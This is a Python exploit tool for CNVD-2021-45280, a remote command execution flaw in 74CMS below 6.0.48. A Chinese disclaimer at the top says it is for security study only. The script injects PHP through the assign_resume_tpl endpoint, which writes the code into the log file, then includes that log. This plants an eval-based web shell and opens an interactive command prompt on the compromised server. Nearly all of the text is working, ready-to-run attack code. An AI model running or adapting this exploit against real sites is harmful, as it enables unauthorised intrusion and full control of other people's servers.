"""
声明：
本文为 漏洞编号 CNVD-2021-45280 ，即 74CMS < 6.0.48 远程命令执行漏洞利用工具源码内容
文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
更多介绍请访问笔者博客：0xtlu.github.io
"""

from requests import Session
from time import strftime, time
from hashlib import md5

# 待检测Host
host = 'http://127.0.0.1/'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'
}


# 报错请求
def request(tpl):
    url = '{host}index.php?m=home&a=assign_resume_tpl'.format(host=host)

    data = {

        'variable': 1,

        'tpl': tpl
    }

    response = Session().post(url=url, headers=headers, data=data, timeout=5)

    # 利用状态码判断是否为 phpinfo() 界面
    return response.status_code


# 连续请求，写入信息
def prove(tpl):
    # 日志写入报错信息
    request(tpl)

    effect = 'data/Runtime/Logs/Home/{data}.log'.format(data=strftime("%y_%m_%d"))

    # 日志 shell 生效
    status_code = request(effect)

    return status_code


# 验证 shell存在
def exist(shellname):
    shellurl = '{host}'.format(host=host) + shellname + '.php'

    text_data = Session().get(url=shellurl, headers=headers, timeout=5).status_code

    if (text_data == 200):
        return shellurl


# shell 命令模式
def command(shellurl):
    flag = 'whoami'

    while (flag != '000'):

        data = {'x': 'echo system("{flag}");'.format(flag=flag)}

        try:

            response = Session().post(url=shellurl, headers=headers, data=data, timeout=5)

            if (response != None):

                print(response.text)

            else:

                print('空界面！！！')
        except:

            print("错误！错误！异常抛出！！！")

        flag = input('\033[5;31m》》》 \033[0m')


# 写shell
def shell():
    shellname = md5(str(int(time())).encode(encoding='utf-8')).hexdigest()[3:9]

    tpl = f'<?php fputs(fopen("{shellname}.php","w"),"<?php eval(\$_POST[x]);?>")?>; ob_flush();?>'.format(
        shellname=shellname)

    print('开始 getshell……')

    # 写入shell
    prove(tpl)

    print('正在检测 shell 存在……')

    # shell 存在验证
    shellurl = exist(shellname)

    if (shellurl != None):

        print('这是您的链接和密码：' + shellurl + ' 》》》 x\n希望您用餐愉快！\n是否进入 shell 模式(1/0)')

        flag = input()

        if (flag == '1'):
            command(shellurl=shellurl)
        else:
            print('谢谢惠顾！')
    else:
        print('Oh……非常可惜，getshell 失败了！')


def window():
    print('0. phpinfo()\n1. getshell')

    inputvalue = input()

    if (inputvalue == '0'):

        print('phpinfo() 验证开始！请等待……')

        tpl = '<?php phpinfo(); ob_flush();?>'

        if (prove(tpl) == 200):
            print('漏洞存在!')

    elif (inputvalue == '1'):

        shell()
    else:
        print('一面之缘！！！')


if __name__ == '__main__':
    window()
